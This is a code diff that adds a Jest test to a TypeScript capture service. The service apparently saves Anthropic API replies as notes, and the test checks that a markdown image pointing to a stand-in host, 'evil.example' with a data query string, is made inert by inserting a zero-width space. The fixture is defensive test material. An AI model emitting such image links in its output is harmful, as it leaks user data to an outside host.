@@ -111,6 +111,14 @@ describe('CaptureService.run()', () => {
     expect(call.url).toBe('https://api.anthropic.com/v1/messages');
   });
 
+  it('writes the reply with remote images inert', async () => {
+    const { app, created } = makeApp();
+    spy.mockResolvedValue(anthropicResp('# T\n![](https://evil.example/p?d=x)'));
+    const svc = new CaptureService(app, () => makeCfg());
+    await svc.run({ content: 'x', silent: true });
+    expect(created[0].body).toBe('# T\n!\u200b[](https://evil.example/p?d=x)');
+  });
+
   it('surfaces provider errors instead of swallowing them (no network call on bad config)', async () => {
     const { app } = makeApp();
     const svc = new CaptureService(
